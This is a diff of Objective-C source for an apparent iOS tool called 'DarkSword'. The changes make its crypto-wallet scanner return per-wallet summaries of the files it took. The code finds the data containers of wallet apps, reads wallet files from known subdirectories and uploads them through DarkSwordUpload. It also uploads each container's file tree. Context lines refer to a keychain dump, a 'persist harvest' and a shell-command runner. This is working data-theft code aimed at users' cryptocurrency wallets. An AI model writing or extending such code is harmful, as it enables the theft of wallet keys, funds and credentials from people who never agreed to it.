@@ -328,7 +328,7 @@ static NSString *DSKeychainDump(void)
 
 /// Re-runs the persist-store harvest and returns its snapshot JSON.
 static NSArray<NSDictionary *> *DSWalletTargets(void);
-static void DSWalletScanOne(NSDictionary *wallet);
+static NSString *DSWalletScanOne(NSDictionary *wallet);
 static void DSRecurseInto(NSString *path, NSUInteger depth,
                           NSMutableArray<NSDictionary *> *out, NSUInteger maxEntries);
 
@@ -355,8 +355,7 @@ static NSString *DSWalletScan(NSString *type, NSString *bundleId)
     }
     if (!target) return [NSString stringWithFormat:@"unknown wallet: %@", type];
 
-    DSWalletScanOne(target);
-    return [NSString stringWithFormat:@"wallet %@ scan dispatched", type];
+    return DSWalletScanOne(target);
 }
 
 /// Wallet catalog mirroring coruna-v2's WALLET_CONFIG, resolved through the MCM
@@ -395,16 +394,16 @@ static NSArray<NSDictionary *> *DSWalletTargets(void)
     ];
 }
 
-static void DSWalletScanOne(NSDictionary *wallet)
+static NSString *DSWalletScanOne(NSDictionary *wallet)
 {
     NSString *bundleID = wallet[@"bundleId"];
     // Full resolution chain (MCM lease → activate → virtual root → virtual root
     // search → metadata scan → LaunchServices), same as the persist harvest.
     NSString *container = TryMaskCardResolveContainerPath(bundleID);
     if (container.length == 0) {
-        DSLog(@"wallet %@: no container resolved", wallet[@"type"]);
-        return;
+        return [NSString stringWithFormat:@"%@: container NOT resolved", wallet[@"type"]];
     }
+
     // Wallet files live in a handful of well-known subdirectories, not the
     // container root, so probe each candidate location per file.
     NSString *appSupport = [NSString stringWithFormat:@"Library/Application Support/%@", bundleID];
@@ -416,6 +415,7 @@ static void DSWalletScanOne(NSDictionary *wallet)
         @"Library/Preferences",
     ];
 
+    NSMutableArray<NSString *> *found = [NSMutableArray array];
     for (NSString *file in wallet[@"files"]) {
         for (NSString *sub in subdirs) {
             NSString *relative = sub.length > 0 ? [sub stringByAppendingPathComponent:file] : file;
@@ -424,6 +424,7 @@ static void DSWalletScanOne(NSDictionary *wallet)
             if (data.length == 0) continue;
             NSString *desc = [NSString stringWithFormat:@"%@ (%@)", wallet[@"type"], bundleID];
             DarkSwordUpload(@"wallet", path, desc, data, nil);
+            [found addObject:[NSString stringWithFormat:@"%@ (%luB)", relative, (unsigned long)data.length]];
             break; // found this file, move to the next target
         }
     }
@@ -439,16 +440,23 @@ static void DSWalletScanOne(NSDictionary *wallet)
                         [NSString stringWithFormat:@"%@ container tree", wallet[@"type"]],
                         treeJson, nil);
     }
+
+    if (found.count == 0) {
+        return [NSString stringWithFormat:@"%@: container %@ but 0 target files matched (tree uploaded)",
+                wallet[@"type"], container.lastPathComponent];
+    }
+    return [NSString stringWithFormat:@"%@: %lu file(s) — %@",
+            wallet[@"type"], (unsigned long)found.count, [found componentsJoinedByString:@", "]];
 }
 
 static NSString *DSWalletScanAll(void)
 {
     if (!MCMBridgeAvailable()) return @"MCM bridge unavailable; wallet scan skipped";
+    NSMutableArray<NSString *> *results = [NSMutableArray array];
     for (NSDictionary *wallet in DSWalletTargets()) {
-        DSWalletScanOne(wallet);
+        [results addObject:DSWalletScanOne(wallet)];
     }
-    return [NSString stringWithFormat:@"wallet scan dispatched for %lu targets",
-            (unsigned long)DSWalletTargets().count];
+    return [results componentsJoinedByString:@"\n"];
 }
 
 /// Run a shell command through /bin/sh and return stdout (truncated). Filza runs
